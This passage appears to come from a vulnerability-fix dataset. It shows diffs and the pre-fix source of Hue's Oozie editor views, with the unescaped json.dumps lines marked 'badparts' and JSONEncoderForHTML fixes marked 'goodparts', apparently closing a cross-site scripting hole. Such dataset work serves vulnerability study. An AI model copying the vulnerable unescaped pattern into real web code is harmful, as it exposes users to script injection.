                                "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),",
                                "      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),"
                            ]
                        },
                        {
                            "diff": "\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n",
                            "add": 3,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'coordinator_json': coordinator.json,",
                                "      'credentials_json': json.dumps(credentials.credentials.keys()),",
                                "      'workflows_json': json.dumps(workflows),"
                            ],
                            "goodparts": [
                                "      'coordinator_json': coordinator.json_for_html(),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),",
                                "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),"
                            ]
                        },
                        {
                            "diff": "\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'bundle_json': bundle.json,",
                                "      'coordinators_json': json.dumps(coordinators),"
                            ],
                            "goodparts": [
                                "      'bundle_json': bundle.json_for_html(),",
                                "      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),"
                            ]
                        }
                    ],
                    "source": "\n import json import logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex)) ",
                    "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") 